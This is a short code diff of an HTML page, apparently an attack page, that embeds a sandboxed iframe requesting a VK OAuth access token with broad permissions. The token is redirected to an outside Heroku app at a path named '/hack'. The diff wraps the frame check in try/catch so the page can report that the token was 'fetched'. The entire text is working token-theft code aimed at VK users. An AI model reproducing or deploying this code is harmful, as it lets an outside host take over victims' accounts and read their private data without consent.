@@ -8,9 +8,12 @@
   </style>
   <script type="text/javascript">
     checkFrame = function() {
-      if(frames[0].location.hash){
-        window.top.postMessage('fetched', "*");
-      }
+       try
+      {
+        if(frames[0].location.hash){
+          window.top.postMessage('fetched', "*");
+        }
+      } catch(err){}
     }
   </script>
   <iframe sandbox="allow-same-origin allow-forms" onLoad="checkFrame()" src="https://oauth.vk.com/authorize?client_id=3396646&scope=1044479&response_type=token&redirect_uri=limitless-peak-1745.herokuapp.com/hack" width="120" height="1180" seamless class="restricted" scrolling="no"></iframe>
